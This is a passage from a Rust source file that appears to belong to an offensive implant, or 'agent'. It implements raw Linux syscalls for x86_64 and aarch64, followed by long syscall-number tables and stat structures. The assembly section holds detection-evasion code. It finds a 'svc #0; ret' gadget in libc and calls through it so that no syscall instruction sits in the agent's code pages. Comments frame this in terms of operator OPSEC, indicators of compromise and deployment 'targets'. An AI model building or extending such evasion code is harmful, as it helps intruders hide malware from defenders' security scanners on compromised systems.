                std::arch::asm!("syscall", in("rax") ssn as u64, in("rdi") args[0], in("rsi") args[1], in("rdx") args[2], in("r10") args[3], in("r8") args[4], in("r9") args[5], lateout("rax") ret, lateout("rcx") _, lateout("r11") _)
            }
            _ => return Err(libc::EINVAL),
        }

        // Check whether seccomp blocked this syscall (SIGSYS delivered).
        if SECCOMP_BLOCKED.swap(false, std::sync::atomic::Ordering::AcqRel) {
            return Err(libc::EPERM);
        }

        if ret < 0 {
            Err(-ret as i32)
        } else {
            Ok(ret as u64)
        }
    }
    #[cfg(target_arch = "aarch64")]
    {
        // Clear the seccomp flag before invoking the syscall so we only
        // detect SIGSYS delivered by *this* call.
        SECCOMP_BLOCKED.store(false, std::sync::atomic::Ordering::Release);

        // Linux syscalls accept at most 6 register arguments on aarch64.
        if args.len() > 6 {
            // Return EINVAL instead of panicking so callers can handle this
            // invalid input path without generating a crash dump.
            return Err(libc::EINVAL);
        }

        let a0 = args.get(0).copied().unwrap_or(0);
        let a1 = args.get(1).copied().unwrap_or(0);
        let a2 = args.get(2).copied().unwrap_or(0);
        let a3 = args.get(3).copied().unwrap_or(0);
        let a4 = args.get(4).copied().unwrap_or(0);
        let a5 = args.get(5).copied().unwrap_or(0);

        // ── Indirect syscall path ───────────────────────────────────────
        // Try to resolve a `svc #0; ret` gadget from a loaded shared library
        // (libc).  When available, we branch to the gadget via `blr` so that
        // no `svc` instruction exists anywhere in the agent's own code pages.
        // This is the aarch64 analogue of the x86_64 Windows technique that
        // calls through a `syscall; ret` gadget in ntdll.
        let gadget: usize = *LIBC_SVC_GADGET.get_or_init(find_libc_svc_gadget);

        let mut ret: i64;
        if gadget != 0 {
            // Indirect syscall: set up registers and branch to the gadget.
            // The gadget executes `svc #0; ret`.  `blr` stores the return
            // address in x30 (LR) so the gadget's `ret` brings us back to the
            // next instruction.
            //
            // We do NOT use `options(nostack)`: the kernel may deliver a
            // signal during the SVC trap and build a signal frame on the
            // user stack.
            std::arch::asm!(
                "mov x8, {ssn}",
                "mov x0, {a0}",
                "mov x1, {a1}",
                "mov x2, {a2}",
                "mov x3, {a3}",
                "mov x4, {a4}",
                "mov x5, {a5}",
                "blr {gadget}",
                // The gadget's `ret` lands here; x0 holds the full signed
                // syscall return value.  Preserve all 64 bits so negative
                // errno returns and pointer-sized values are not truncated.
                "mov x9, x0",
                ssn   = in(reg) ssn as u64,
                a0    = in(reg) a0,
                a1    = in(reg) a1,
                a2    = in(reg) a2,
                a3    = in(reg) a3,
                a4    = in(reg) a4,
                a5    = in(reg) a5,
                gadget = in(reg) gadget as u64,
                lateout("x9") ret,
                // Declare all caller-saved / scratch registers that the SVC
                // entry path or the kernel may clobber.  x0–x7 hold args and
                // the return value; x8 is the syscall number; x9–x17 are
                // IP0/IP1 and other volatile temporaries; x16/x17 may also be
                // used by the PLT veneer in the gadget's host library.  x30
                // is overwritten by `blr`.
                out("x0")  _, out("x1")  _, out("x2")  _, out("x3")  _,
                out("x4")  _, out("x5")  _, out("x6")  _, out("x7")  _,
                out("x8")  _,
                out("x10") _, out("x11") _,
                out("x12") _, out("x13") _, out("x14") _, out("x15") _,
                out("x16") _, out("x17") _,
                out("x30") _,
            );
        } else {
            // ── Direct syscall fallback ──────────────────────────────────
            // No gadget was found.  Fall back to an inline `svc #0`.  This
            // path is functionally correct but leaves a `svc` instruction in
            // the agent binary — a potential IoC for security scanners.
            //
            // **OPSEC warning**: Every invocation of this fallback path emits a
            // warning so operators are aware that `svc` instructions appear in
            // the agent's own code pages.  Deploy on targets where this IoC is
            // acceptable, or pre-load a library containing a `svc #0; ret`
            // gadget.
            tracing::warn!(
                "syscalls: using inline svc #0 fallback for syscall {} — \
                 no libc svc gadget was found.  This leaves svc instructions \
                 in agent code pages (IoC risk).",
                ssn
            );
            //
            // svc involves a mode switch; x30 etc. may be modified by the
            // kernel entry path.  Do not use options(nostack).
            match args.len() {
                0 => {
                    std::arch::asm!("svc 0",
                        in("x8") ssn as u64,
                        lateout("x0") ret,
                        out("x1") _, out("x2") _, out("x3") _,
                        out("x4") _, out("x5") _, out("x6") _, out("x7") _)
                }
                1 => {
                    std::arch::asm!("svc 0",
                        in("x8") ssn as u64, in("x0") a0,
                        lateout("x0") ret,
                        out("x1") _, out("x2") _, out("x3") _,
                        out("x4") _, out("x5") _, out("x6") _, out("x7") _)
                }
                2 => {
                    std::arch::asm!("svc 0",
                        in("x8") ssn as u64, in("x0") a0, in("x1") a1,
                        lateout("x0") ret,
                        out("x2") _, out("x3") _,
                        out("x4") _, out("x5") _, out("x6") _, out("x7") _)
                }
                3 => {
                    std::arch::asm!("svc 0",
                        in("x8") ssn as u64, in("x0") a0, in("x1") a1, in("x2") a2,
                        lateout("x0") ret,
                        out("x3") _,
                        out("x4") _, out("x5") _, out("x6") _, out("x7") _)
                }
                4 => {
                    std::arch::asm!("svc 0",
                        in("x8") ssn as u64,
                        in("x0") a0, in("x1") a1, in("x2") a2, in("x3") a3,
                        lateout("x0") ret,
                        out("x4") _, out("x5") _, out("x6") _, out("x7") _)
                }
                5 => {
                    std::arch::asm!("svc 0",
                        in("x8") ssn as u64,
                        in("x0") a0, in("x1") a1, in("x2") a2, in("x3") a3,
                        in("x4") a4,
                        lateout("x0") ret,
                        out("x5") _, out("x6") _, out("x7") _)
                }
                6 => {
                    std::arch::asm!("svc 0",
                        in("x8") ssn as u64,
                        in("x0") a0, in("x1") a1, in("x2") a2, in("x3") a3,
                        in("x4") a4, in("x5") a5,
                        lateout("x0") ret,
                        out("x6") _, out("x7") _)
                }
                // Length > 6 was already rejected above.
                _ => unreachable!(),
            }
        }
        // Check whether seccomp blocked this syscall (SIGSYS delivered).
        if SECCOMP_BLOCKED.swap(false, std::sync::atomic::Ordering::AcqRel) {
            return Err(libc::EPERM);
        }

        let ret_signed = ret as i64;
        if ret_signed < 0 {
            Err((-ret_signed) as i32)
        } else {
            Ok(ret)
        }
    }
    #[cfg(not(any(target_arch = "x86_64", target_arch = "aarch64")))]
    compile_error!("Unsupported architecture for direct syscalls");
}

#[cfg(all(unix, feature = "direct-syscalls"))]
fn syscall_number_raw(name: &str) -> anyhow::Result<u32> {
    #[cfg(target_arch = "x86_64")]
    match name {
        "read" => Ok(0),
        "write" => Ok(1),
        // Deprecated on Linux 5.x+ and often blocked by seccomp in containerized/sandboxed environments; prefer openat (257) with AT_FDCWD for compatibility.
        "open" => Ok(2),
        "close" => Ok(3),
        "stat" => Ok(4),
        "fstat" => Ok(5),
        "lstat" => Ok(6),
        "poll" => Ok(7),
        "lseek" => Ok(8),
        "mmap" => Ok(9),
        "mprotect" => Ok(10),
        "munmap" => Ok(11),
        "brk" => Ok(12),
        "rt_sigaction" => Ok(13),
        "rt_sigprocmask" => Ok(14),
        "rt_sigreturn" => Ok(15),
        "ioctl" => Ok(16),
        "pread64" => Ok(17),
        "pwrite64" => Ok(18),
        "readv" => Ok(19),
        "writev" => Ok(20),
        "access" => Ok(21),
        "pipe" => Ok(22),
        "select" => Ok(23),
        "sched_yield" => Ok(24),
        "mremap" => Ok(25),
        "msync" => Ok(26),
        "mincore" => Ok(27),
        "madvise" => Ok(28),
        "shmget" => Ok(29),
        "shmat" => Ok(30),
        "shmctl" => Ok(31),
        "dup" => Ok(32),
        "dup2" => Ok(33),
        "pause" => Ok(34),
        "nanosleep" => Ok(35),
        "getitimer" => Ok(36),
        "alarm" => Ok(37),
        "setitimer" => Ok(38),
        "getpid" => Ok(39),
        "sendfile" => Ok(40),
        "socket" => Ok(41),
        "connect" => Ok(42),
        "accept" => Ok(43),
        "sendto" => Ok(44),
        "recvfrom" => Ok(45),
        "sendmsg" => Ok(46),
        "recvmsg" => Ok(47),
        "shutdown" => Ok(48),
        "bind" => Ok(49),
        "listen" => Ok(50),
        "getsockname" => Ok(51),
        "getpeername" => Ok(52),
        "socketpair" => Ok(53),
        "setsockopt" => Ok(54),
        "getsockopt" => Ok(55),
        "clone" => Ok(56),
        "fork" => Ok(57),
        "vfork" => Ok(58),
        "execve" => Ok(59),
        "exit" => Ok(60),
        "wait4" => Ok(61),
        "kill" => Ok(62),
        "uname" => Ok(63),
        "semget" => Ok(64),
        "semop" => Ok(65),
        "semctl" => Ok(66),
        "shmdt" => Ok(67),
        "msgget" => Ok(68),
        "msgsnd" => Ok(69),
        "msgrcv" => Ok(70),
        "msgctl" => Ok(71),
        "fcntl" => Ok(72),
        "flock" => Ok(73),
        "fsync" => Ok(74),
        "fdatasync" => Ok(75),
        "truncate" => Ok(76),
        "ftruncate" => Ok(77),
        "getdents" => Ok(78),
        "getcwd" => Ok(79),
        "chdir" => Ok(80),
        "fchdir" => Ok(81),
        "rename" => Ok(82),
        "mkdir" => Ok(83),
        "rmdir" => Ok(84),
        "creat" => Ok(85),
        "link" => Ok(86),
        "unlink" => Ok(87),
        "symlink" => Ok(88),
        "readlink" => Ok(89),
        "chmod" => Ok(90),
        "fchmod" => Ok(91),
        "chown" => Ok(92),
        "fchown" => Ok(93),
        "lchown" => Ok(94),
        "umask" => Ok(95),
        "gettimeofday" => Ok(96),
        "getrlimit" => Ok(97),
        "getrusage" => Ok(98),
        "sysinfo" => Ok(99),
        "times" => Ok(100),
        "ptrace" => Ok(101),
        "getuid" => Ok(102),
        "syslog" => Ok(103),
        "getgid" => Ok(104),
        "setuid" => Ok(105),
        "setgid" => Ok(106),
        "geteuid" => Ok(107),
        "getegid" => Ok(108),
        "setpgid" => Ok(109),
        "getppid" => Ok(110),
        "getpgrp" => Ok(111),
        "setsid" => Ok(112),
        "setreuid" => Ok(113),
        "setregid" => Ok(114),
        "getgroups" => Ok(115),
        "setgroups" => Ok(116),
        "setresuid" => Ok(117),
        "getresuid" => Ok(118),
        "setresgid" => Ok(119),
        "getresgid" => Ok(120),
        "getpgid" => Ok(121),
        "setfsuid" => Ok(122),
        "setfsgid" => Ok(123),
        "getsid" => Ok(124),
        "capget" => Ok(125),
        "capset" => Ok(126),
        "rt_sigpending" => Ok(127),
        "rt_sigtimedwait" => Ok(128),
        "rt_sigqueueinfo" => Ok(129),
        "rt_sigsuspend" => Ok(130),
        "sigaltstack" => Ok(131),
        "utime" => Ok(132),
        "mknod" => Ok(133),
        "uselib" => Ok(134),
        "personality" => Ok(135),
        "ustat" => Ok(136),
        "statfs" => Ok(137),
        "fstatfs" => Ok(138),
        "sysfs" => Ok(139),
        "getpriority" => Ok(140),
        "setpriority" => Ok(141),
        "sched_setparam" => Ok(142),
        "sched_getparam" => Ok(143),
        "sched_setscheduler" => Ok(144),
        "sched_getscheduler" => Ok(145),
        "sched_get_priority_max" => Ok(146),
        "sched_get_priority_min" => Ok(147),
        "sched_rr_get_interval" => Ok(148),
        "mlock" => Ok(149),
        "munlock" => Ok(150),
        "mlockall" => Ok(151),
        "munlockall" => Ok(152),
        "vhangup" => Ok(153),
        "modify_ldt" => Ok(154),
        "pivot_root" => Ok(155),
        "_sysctl" => Ok(156),
        "prctl" => Ok(157),
        "arch_prctl" => Ok(158),
        "adjtimex" => Ok(159),
        "setrlimit" => Ok(160),
        "chroot" => Ok(161),
        "sync" => Ok(162),
        "acct" => Ok(163),
        "settimeofday" => Ok(164),
        "mount" => Ok(165),
        "umount2" => Ok(166),
        "swapon" => Ok(167),
        "swapoff" => Ok(168),
        "reboot" => Ok(169),
        "sethostname" => Ok(170),
        "setdomainname" => Ok(171),
        "iopl" => Ok(172),
        "ioperm" => Ok(173),
        "create_module" => Ok(174),
        "init_module" => Ok(175),
        "delete_module" => Ok(176),
        "get_kernel_syms" => Ok(177),
        "query_module" => Ok(178),
        "quotactl" => Ok(179),
        "nfsservctl" => Ok(180),
        "getpmsg" => Ok(181),
        "putpmsg" => Ok(182),
        "afs_syscall" => Ok(183),
        "tuxcall" => Ok(184),
        "security" => Ok(185),
        "gettid" => Ok(186),
        "readahead" => Ok(187),
        "setxattr" => Ok(188),
        "lsetxattr" => Ok(189),
        "fsetxattr" => Ok(190),
        "getxattr" => Ok(191),
        "lgetxattr" => Ok(192),
        "fgetxattr" => Ok(193),
        "listxattr" => Ok(194),
        "llistxattr" => Ok(195),
        "flistxattr" => Ok(196),
        "removexattr" => Ok(197),
        "lremovexattr" => Ok(198),
        "fremovexattr" => Ok(199),
        "tkill" => Ok(200),
        "time" => Ok(201),
        "futex" => Ok(202),
        "sched_setaffinity" => Ok(203),
        "sched_getaffinity" => Ok(204),
        "set_thread_area" => Ok(205),
        "io_setup" => Ok(206),
        "io_destroy" => Ok(207),
        "io_getevents" => Ok(208),
        "io_submit" => Ok(209),
        "io_cancel" => Ok(210),
        "get_thread_area" => Ok(211),
        "lookup_dcookie" => Ok(212),
        "epoll_create" => Ok(213),
        "epoll_ctl_old" => Ok(214),
        "epoll_wait_old" => Ok(215),
        "remap_file_pages" => Ok(216),
        "getdents64" => Ok(217),
        "set_tid_address" => Ok(218),
        "restart_syscall" => Ok(219),
        "semtimedop" => Ok(220),
        "fadvise64" => Ok(221),
        "timer_create" => Ok(222),
        "timer_settime" => Ok(223),
        "timer_gettime" => Ok(224),
        "timer_getoverrun" => Ok(225),
        "timer_delete" => Ok(226),
        "clock_settime" => Ok(227),
        "clock_gettime" => Ok(228),
        "clock_getres" => Ok(229),
        "clock_nanosleep" => Ok(230),
        "exit_group" => Ok(231),
        "epoll_wait" => Ok(232),
        "epoll_ctl" => Ok(233),
        "tgkill" => Ok(234),
        "utimes" => Ok(235),
        "vserver" => Ok(236),
        "mbind" => Ok(237),
        "set_mempolicy" => Ok(238),
        "get_mempolicy" => Ok(239),
        "mq_open" => Ok(240),
        "mq_unlink" => Ok(241),
        "mq_timedsend" => Ok(242),
        "mq_timedreceive" => Ok(243),
        "mq_notify" => Ok(244),
        "mq_getsetattr" => Ok(245),
        "kexec_load" => Ok(246),
        "waitid" => Ok(247),
        "add_key" => Ok(248),
        "request_key" => Ok(249),
        "keyctl" => Ok(250),
        "ioprio_set" => Ok(251),
        "ioprio_get" => Ok(252),
        "inotify_init" => Ok(253),
        "inotify_add_watch" => Ok(254),
        "inotify_rm_watch" => Ok(255),
        "migrate_pages" => Ok(256),
        "openat" => Ok(257),
        "mkdirat" => Ok(258),
        "mknodat" => Ok(259),
        "fchownat" => Ok(260),
        "futimesat" => Ok(261),
        "newfstatat" => Ok(262),
        "unlinkat" => Ok(263),
        "renameat" => Ok(264),
        "linkat" => Ok(265),
        "symlinkat" => Ok(266),
        "readlinkat" => Ok(267),
        "fchmodat" => Ok(268),
        "faccessat" => Ok(269),
        "pselect6" => Ok(270),
        "ppoll" => Ok(271),
        "unshare" => Ok(272),
        "set_robust_list" => Ok(273),
        "get_robust_list" => Ok(274),
        "splice" => Ok(275),
        "tee" => Ok(276),
        "sync_file_range" => Ok(277),
        "vmsplice" => Ok(278),
        "move_pages" => Ok(279),
        "utimensat" => Ok(280),
        "epoll_pwait" => Ok(281),
        "signalfd" => Ok(282),
        "timerfd_create" => Ok(283),
        "eventfd" => Ok(284),
        "fallocate" => Ok(285),
        "timerfd_settime" => Ok(286),
        "timerfd_gettime" => Ok(287),
        "accept4" => Ok(288),
        "signalfd4" => Ok(289),
        "eventfd2" => Ok(290),
        "epoll_create1" => Ok(291),
        "dup3" => Ok(292),
        "pipe2" => Ok(293),
        "inotify_init1" => Ok(294),
        "preadv" => Ok(295),
        "pwritev" => Ok(296),
        "rt_tgsigqueueinfo" => Ok(297),
        "perf_event_open" => Ok(298),
        "recvmmsg" => Ok(299),
        "fanotify_init" => Ok(300),
        "fanotify_mark" => Ok(301),
        "prlimit64" => Ok(302),
        "name_to_handle_at" => Ok(303),
        "open_by_handle_at" => Ok(304),
        "clock_adjtime" => Ok(305),
        "syncfs" => Ok(306),
        "sendmmsg" => Ok(307),
        "setns" => Ok(308),
        "getcpu" => Ok(309),
        "process_vm_readv" => Ok(310),
        "process_vm_writev" => Ok(311),
        "kcmp" => Ok(312),
        "finit_module" => Ok(313),
        "sched_setattr" => Ok(314),
        "sched_getattr" => Ok(315),
        "renameat2" => Ok(316),
        "seccomp" => Ok(317),
        "getrandom" => Ok(318),
        "memfd_create" => Ok(319),
        "kexec_file_load" => Ok(320),
        "bpf" => Ok(321),
        "execveat" => Ok(322),
        "userfaultfd" => Ok(323),
        "membarrier" => Ok(324),
        "mlock2" => Ok(325),
        "copy_file_range" => Ok(326),
        "preadv2" => Ok(327),
        "pwritev2" => Ok(328),
        "pkey_mprotect" => Ok(329),
        "pkey_alloc" => Ok(330),
        "pkey_free" => Ok(331),
        "statx" => Ok(332),
        "io_pgetevents" => Ok(333),
        "rseq" => Ok(334),
        // Syscalls added in kernel 5.10+
        "pidfd_send_signal" => Ok(424),
        "io_uring_setup" => Ok(425),
        "io_uring_enter" => Ok(426),
        "io_uring_register" => Ok(427),
        "open_tree" => Ok(428),
        "move_mount" => Ok(429),
        "fsopen" => Ok(430),
        "fsconfig" => Ok(431),
        "fsmount" => Ok(432),
        "fspick" => Ok(433),
        "pidfd_open" => Ok(434),
        "clone3" => Ok(435),
        "close_range" => Ok(436),
        "openat2" => Ok(437),
        "pidfd_getfd" => Ok(438),
        "faccessat2" => Ok(439),
        "process_madvise" => Ok(440),
        "epoll_pwait2" => Ok(441),
        "mount_setattr" => Ok(442),
        "quotactl_fd" => Ok(443),
        "landlock_create_ruleset" => Ok(444),
        "landlock_add_rule" => Ok(445),
        "landlock_restrict_self" => Ok(446),
        "memfd_secret" => Ok(447),
        "process_mrelease" => Ok(448),
        "futex_waitv" => Ok(449),
        "set_mempolicy_home_node" => Ok(450),
        "cachestat" => Ok(451),
        "fchmodat2" => Ok(452),
        "map_shadow_stack" => Ok(453),
        "futex_wake" => Ok(454),
        "futex_wait" => Ok(455),
        "futex_requeue" => Ok(456),
        "statmount" => Ok(457),
        "listmount" => Ok(458),
        "lsm_get_self_attr" => Ok(459),
        "lsm_set_self_attr" => Ok(460),
        "lsm_list_modules" => Ok(461),
        _ => anyhow::bail!("unknown x86_64 syscall: {}", name),
    }

    #[cfg(target_arch = "aarch64")]
    match name {
        "io_setup" => Ok(0),
        "io_destroy" => Ok(1),
        "io_submit" => Ok(2),
        "io_cancel" => Ok(3),
        "io_getevents" => Ok(4),
        "setxattr" => Ok(5),
        "lsetxattr" => Ok(6),
        "fsetxattr" => Ok(7),
        "getxattr" => Ok(8),
        "lgetxattr" => Ok(9),
        "fgetxattr" => Ok(10),
        "listxattr" => Ok(11),
        "llistxattr" => Ok(12),
        "flistxattr" => Ok(13),
        "removexattr" => Ok(14),
        "lremovexattr" => Ok(15),
        "fremovexattr" => Ok(16),
        "getcwd" => Ok(17),
        "lookup_dcookie" => Ok(18),
        "eventfd2" => Ok(19),
        "epoll_create1" => Ok(20),
        "epoll_ctl" => Ok(21),
        "epoll_pwait" => Ok(22),
        "dup" => Ok(23),
        "dup3" => Ok(24),
        "fcntl" => Ok(25),
        "inotify_init1" => Ok(26),
        "inotify_add_watch" => Ok(27),
        "inotify_rm_watch" => Ok(28),
        "ioctl" => Ok(29),
        "ioprio_set" => Ok(30),
        "ioprio_get" => Ok(31),
        "flock" => Ok(32),
        "mknodat" => Ok(33),
        "mkdirat" => Ok(34),
        "unlinkat" => Ok(35),
        "symlinkat" => Ok(36),
        "linkat" => Ok(37),
        "renameat" => Ok(38),
        "umount2" => Ok(39),
        "mount" => Ok(40),
        "pivot_root" => Ok(41),
        "nfsservctl" => Ok(42),
        "statfs" => Ok(43),
        "fstatfs" => Ok(44),
        "truncate" => Ok(45),
        "ftruncate" => Ok(46),
        "fallocate" => Ok(47),
        "faccessat" => Ok(48),
        "chdir" => Ok(49),
        "fchdir" => Ok(50),
        "chroot" => Ok(51),
        "fchmod" => Ok(52),
        "fchmodat" => Ok(53),
        "fchownat" => Ok(54),
        "fchown" => Ok(55),
        "openat" => Ok(56),
        "close" => Ok(57),
        "vhangup" => Ok(58),
        "pipe2" => Ok(59),
        "quotactl" => Ok(60),
        "getdents64" => Ok(61),
        "lseek" => Ok(62),
        "read" => Ok(63),
        "write" => Ok(64),
        "readv" => Ok(65),
        "writev" => Ok(66),
        "pread64" => Ok(67),
        "pwrite64" => Ok(68),
        "preadv" => Ok(69),
        "pwritev" => Ok(70),
        "sendfile" => Ok(71),
        "pselect6" => Ok(72),
        "ppoll" => Ok(73),
        "signalfd4" => Ok(74),
        "vmsplice" => Ok(75),
        "splice" => Ok(76),
        "tee" => Ok(77),
        "readlinkat" => Ok(78),
        "newfstatat" => Ok(79),
        "fstat" => Ok(80),
        "sync" => Ok(81),
        "fsync" => Ok(82),
        "fdatasync" => Ok(83),
        "sync_file_range" => Ok(84),
        "timerfd_create" => Ok(85),
        "timerfd_settime" => Ok(86),
        "timerfd_gettime" => Ok(87),
        "utimensat" => Ok(88),
        "acct" => Ok(89),
        "capget" => Ok(90),
        "capset" => Ok(91),
        "personality" => Ok(92),
        "exit" => Ok(93),
        "exit_group" => Ok(94),
        "waitid" => Ok(95),
        "set_tid_address" => Ok(96),
        "unshare" => Ok(97),
        "futex" => Ok(98),
        "set_robust_list" => Ok(99),
        "get_robust_list" => Ok(100),
        "nanosleep" => Ok(101),
        "getitimer" => Ok(102),
        "setitimer" => Ok(103),
        "kexec_load" => Ok(104),
        "init_module" => Ok(105),
        "delete_module" => Ok(106),
        "timer_create" => Ok(107),
        "timer_gettime" => Ok(108),
        "timer_getoverrun" => Ok(109),
        "timer_settime" => Ok(110),
        "timer_delete" => Ok(111),
        "clock_settime" => Ok(112),
        "clock_gettime" => Ok(113),
        "clock_getres" => Ok(114),
        "clock_nanosleep" => Ok(115),
        "syslog" => Ok(116),
        "ptrace" => Ok(117),
        "sched_setparam" => Ok(118),
        "sched_setscheduler" => Ok(119),
        "sched_getscheduler" => Ok(120),
        "sched_getparam" => Ok(121),
        "sched_setaffinity" => Ok(122),
        "sched_getaffinity" => Ok(123),
        "sched_yield" => Ok(124),
        "sched_get_priority_max" => Ok(125),
        "sched_get_priority_min" => Ok(126),
        "sched_rr_get_interval" => Ok(127),
        "restart_syscall" => Ok(128),
        "kill" => Ok(129),
        "tkill" => Ok(130),
        "tgkill" => Ok(131),
        "sigaltstack" => Ok(132),
        "rt_sigsuspend" => Ok(133),
        "rt_sigaction" => Ok(134),
        "rt_sigprocmask" => Ok(135),
        "rt_sigpending" => Ok(136),
        "rt_sigtimedwait" => Ok(137),
        "rt_sigqueueinfo" => Ok(138),
        "rt_sigreturn" => Ok(139),
        "setpriority" => Ok(140),
        "getpriority" => Ok(141),
        "reboot" => Ok(142),
        "setregid" => Ok(143),
        "setgid" => Ok(144),
        "setreuid" => Ok(145),
        "setuid" => Ok(146),
        "setresuid" => Ok(147),
        "getresuid" => Ok(148),
        "setresgid" => Ok(149),
        "getresgid" => Ok(150),
        "setfsuid" => Ok(151),
        "setfsgid" => Ok(152),
        "times" => Ok(153),
        "setpgid" => Ok(154),
        "getpgid" => Ok(155),
        "getsid" => Ok(156),
        "setsid" => Ok(157),
        "getgroups" => Ok(158),
        "setgroups" => Ok(159),
        "uname" => Ok(160),
        "sethostname" => Ok(161),
        "setdomainname" => Ok(162),
        "getrlimit" => Ok(163),
        "setrlimit" => Ok(164),
        "getrusage" => Ok(165),
        "umask" => Ok(166),
        "prctl" => Ok(167),
        "getcpu" => Ok(168),
        "gettimeofday" => Ok(169),
        "settimeofday" => Ok(170),
        "adjtimex" => Ok(171),
        "getpid" => Ok(172),
        "getppid" => Ok(173),
        "getuid" => Ok(174),
        "geteuid" => Ok(175),
        "getgid" => Ok(176),
        "getegid" => Ok(177),
        "gettid" => Ok(178),
        "sysinfo" => Ok(179),
        "mq_open" => Ok(180),
        "mq_unlink" => Ok(181),
        "mq_timedsend" => Ok(182),
        "mq_timedreceive" => Ok(183),
        "mq_notify" => Ok(184),
        "mq_getsetattr" => Ok(185),
        "msgget" => Ok(186),
        "msgctl" => Ok(187),
        "msgrcv" => Ok(188),
        "msgsnd" => Ok(189),
        "semget" => Ok(190),
        "semctl" => Ok(191),
        "semtimedop" => Ok(192),
        "semop" => Ok(193),
        "shmget" => Ok(194),
        "shmctl" => Ok(195),
        "shmat" => Ok(196),
        "shmdt" => Ok(197),
        "socket" => Ok(198),
        "socketpair" => Ok(199),
        "bind" => Ok(200),
        "listen" => Ok(201),
        "accept" => Ok(202),
        "connect" => Ok(203),
        "getsockname" => Ok(204),
        "getpeername" => Ok(205),
        "sendto" => Ok(206),
        "recvfrom" => Ok(207),
        "setsockopt" => Ok(208),
        "getsockopt" => Ok(209),
        "shutdown" => Ok(210),
        "sendmsg" => Ok(211),
        "recvmsg" => Ok(212),
        "readahead" => Ok(213),
        "brk" => Ok(214),
        "munmap" => Ok(215),
        "mremap" => Ok(216),
        "add_key" => Ok(217),
        "request_key" => Ok(218),
        "keyctl" => Ok(219),
        "clone" => Ok(220),
        "execve" => Ok(221),
        "mmap" => Ok(222),
        "fadvise64" => Ok(223),
        "swapon" => Ok(224),
        "swapoff" => Ok(225),
        "mprotect" => Ok(226),
        "msync" => Ok(227),
        "mlock" => Ok(228),
        "munlock" => Ok(229),
        "mlockall" => Ok(230),
        "munlockall" => Ok(231),
        "mincore" => Ok(232),
        "madvise" => Ok(233),
        "remap_file_pages" => Ok(234),
        "mbind" => Ok(235),
        "get_mempolicy" => Ok(236),
        "set_mempolicy" => Ok(237),
        "migrate_pages" => Ok(238),
        "move_pages" => Ok(239),
        "rt_tgsigqueueinfo" => Ok(240),
        "perf_event_open" => Ok(241),
        "accept4" => Ok(242),
        "recvmmsg" => Ok(243),
        "arch_specific_syscall" => Ok(244),
        "wait4" => Ok(260),
        "prlimit64" => Ok(261),
        "fanotify_init" => Ok(262),
        "fanotify_mark" => Ok(263),
        "name_to_handle_at" => Ok(264),
        "open_by_handle_at" => Ok(265),
        "clock_adjtime" => Ok(266),
        "syncfs" => Ok(267),
        "setns" => Ok(268),
        "sendmmsg" => Ok(269),
        "process_vm_readv" => Ok(270),
        "process_vm_writev" => Ok(271),
        "kcmp" => Ok(272),
        "finit_module" => Ok(273),
        "sched_setattr" => Ok(274),
        "sched_getattr" => Ok(275),
        "renameat2" => Ok(276),
        "seccomp" => Ok(277),
        "getrandom" => Ok(278),
        "memfd_create" => Ok(279),
        "bpf" => Ok(280),
        "execveat" => Ok(281),
        "userfaultfd" => Ok(282),
        "membarrier" => Ok(283),
        "mlock2" => Ok(284),
        "copy_file_range" => Ok(285),
        "preadv2" => Ok(286),
        "pwritev2" => Ok(287),
        "pkey_mprotect" => Ok(288),
        "pkey_alloc" => Ok(289),
        "pkey_free" => Ok(290),
        "statx" => Ok(291),
        "io_pgetevents" => Ok(292),
        "rseq" => Ok(293),
        // Syscalls added in kernel 5.10+
        "pidfd_send_signal" => Ok(424),
        "io_uring_setup" => Ok(425),
        "io_uring_enter" => Ok(426),
        "io_uring_register" => Ok(427),
        "open_tree" => Ok(428),
        "move_mount" => Ok(429),
        "fsopen" => Ok(430),
        "fsconfig" => Ok(431),
        "fsmount" => Ok(432),
        "fspick" => Ok(433),
        "pidfd_open" => Ok(434),
        "clone3" => Ok(435),
        "close_range" => Ok(436),
        "openat2" => Ok(437),
        "pidfd_getfd" => Ok(438),
        "faccessat2" => Ok(439),
        "process_madvise" => Ok(440),
        "epoll_pwait2" => Ok(441),
        "mount_setattr" => Ok(442),
        "quotactl_fd" => Ok(443),
        "landlock_create_ruleset" => Ok(444),
        "landlock_add_rule" => Ok(445),
        "landlock_restrict_self" => Ok(446),
        "memfd_secret" => Ok(447),
        "process_mrelease" => Ok(448),
        "futex_waitv" => Ok(449),
        "set_mempolicy_home_node" => Ok(450),
        "cachestat" => Ok(451),
        "fchmodat2" => Ok(452),
        "map_shadow_stack" => Ok(453),
        "futex_wake" => Ok(454),
        "futex_wait" => Ok(455),
        "futex_requeue" => Ok(456),
        "statmount" => Ok(457),
        "listmount" => Ok(458),
        "lsm_get_self_attr" => Ok(459),
        "lsm_set_self_attr" => Ok(460),
        "lsm_list_modules" => Ok(461),
        _ => anyhow::bail!("unknown aarch64 syscall: {}", name),
    }

    #[cfg(not(any(target_arch = "x86_64", target_arch = "aarch64")))]
    compile_error!("Unsupported architecture for direct syscalls");
}

/// Look up a Linux syscall by name and return a [`SyscallTarget`].
///
/// Results are memoised in [`LINUX_SYSCALL_CACHE`] so repeated lookups for the
/// same name avoid re-running the match.
#[cfg(all(unix, feature = "direct-syscalls"))]
pub fn get_syscall_id(name: &str) -> anyhow::Result<SyscallTarget> {
    let cache = LINUX_SYSCALL_CACHE.get_or_init(|| Mutex::new(HashMap::new()));
    {
        let guard = cache.lock_recover();
        if let Some(&ssn) = guard.get(name) {
            return Ok(SyscallTarget { ssn });
        }
    }
    let ssn = syscall_number_raw(name)?;
    cache.lock_recover().insert(name.to_owned(), ssn);
    Ok(SyscallTarget { ssn })
}

#[cfg(all(unix, feature = "direct-syscalls"))]
#[allow(non_camel_case_types)]
#[repr(C)]
#[derive(Debug, Clone)]
pub struct dirent64 {
    pub d_ino: u64,
    pub d_off: i64,
    pub d_reclen: u16,
    pub d_type: u8,
    pub d_name: [u8; 256],
}

#[cfg(all(unix, feature = "direct-syscalls"))]
#[allow(non_camel_case_types)]
#[repr(C)]
#[derive(Debug, Clone)]
pub struct stat64 {
    pub st_dev: u64,
    pub st_ino: u64,
    pub st_nlink: u64,
    pub st_mode: u32,
    pub st_uid: u32,
    pub st_gid: u32,
    pub __pad0: u32,
    pub st_rdev: u64,
    pub st_size: i64,
    pub st_blksize: i64,
    pub st_blocks: i64,
    pub st_atime: i64,
    pub st_atime_nsec: u64,
    pub st_mtime: i64,
    pub st_mtime_nsec: u64,
    pub st_ctime: i64,
    pub st_ctime_nsec: u64,
    pub __unused: [i64; 3],
}

#[cfg(windows)]
thread_local! {
